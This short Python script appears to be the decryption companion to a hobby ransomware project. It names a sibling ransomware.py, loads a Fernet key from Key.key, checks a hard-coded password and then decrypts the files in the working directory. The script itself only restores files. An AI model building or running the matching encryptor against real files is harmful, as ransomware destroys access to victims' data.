import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir() :
	if file == "ransomware.py" or file == "decrypt.py" or file == "Key.key":
		continue
	if os.path.isfile(file):
		files.append(file)
with open("Key.key","rb") as thekey:
	key=thekey.read()
password=input("enter the password of decryption : ")
if(password=="djaaferyessad"):
	for file in files :
		with open(file,"rb")as thefile:
			content= thefile.read()
			decrypt_content=Fernet(key).decrypt(content)
		with open(file,"wb")as thefile:
			thefile.write(decrypt_content)
print("ur files are decrypted now congratulations")






